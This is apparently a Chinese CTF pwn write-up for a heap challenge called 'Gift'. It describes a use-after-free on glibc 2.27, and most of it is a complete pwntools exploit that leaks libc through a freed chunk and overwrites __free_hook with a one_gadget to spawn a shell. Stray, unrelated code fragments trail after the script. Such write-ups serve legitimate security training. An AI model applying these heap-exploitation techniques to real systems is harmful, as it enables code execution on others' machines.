Gift

存在uaf，但是只能申请10次堆块，每次只能申请0x60或者0x100大小的堆块，往里写的内容是往user_data+0x10处写（比赛时好像没有给libc，看网上的wp确定的是2.27）

exp：

from pwn import *
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
context.log_level = 'debug'
io = process('./pwn')
libc = ELF('/home/youlin/tools/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so')


def dbg():
    gdb.attach(io)
    pause()

def menu(choice):
    io.recvuntil(b"your choice:")
    io.sendline(str(choice))

def add(what,content):
    menu(2)
    io.recvuntil(b"your choice:")
    io.sendline(str(what))
    io.recvuntil(b"plz write your wish on your gift!")
    io.send(content)

def delete(idx):
    menu(3)
    io.recvuntil(b"index?")
    io.sendline(str(idx))

def show(idx):
    menu(4)
    io.recvuntil(b"index?")
    io.sendline(str(idx))

def bargain(idx,offset):
    menu(5)
    io.recvuntil(b"index?")
    io.sendline(str(idx))
    io.recvuntil(b"How much?")
    io.sendline(str(offset))

add(1,b'a'*0xc0+p64(0)+p64(0x451))#0 为后面构造fakechunk做准备
add(1,b'a'*8)#1
add(1,b'a'*8)#2
add(1,b'a'*8)#3
add(1,b'a'*0xd0+p64(0)+p64(0x21))#4 同上

delete(0)
delete(2)
bargain(2,-0xe0)#修改fd指针为+0xe0

add(1,b'a'*8)#5 
add(1,b'a'*8)#6
delete(6)
show(6)
io.recvuntil(b'cost: ')
#-0x1ecba0
base = int(io.recvuntil(b'\n')[:-1],10)-96-0x10-libc.sym['__malloc_hook']
free_hook=base+libc.sym['__free_hook']
one_gadget=base+0x4f322
delete(3)
delete(1)
add(2,p64(free_hook-0x10)*8)#7
#add(1,b'/bin/sh\x00')#8
add(1,b'aaaa')
add(1,p64(one_gadget))#9
delete(3)
io.interactive()

    menu(4)
    io.recvuntil(b"Input index: ")

for i in range(8):#3-10
    add(0x1f8)

    delete(j)

add(0x218)#4
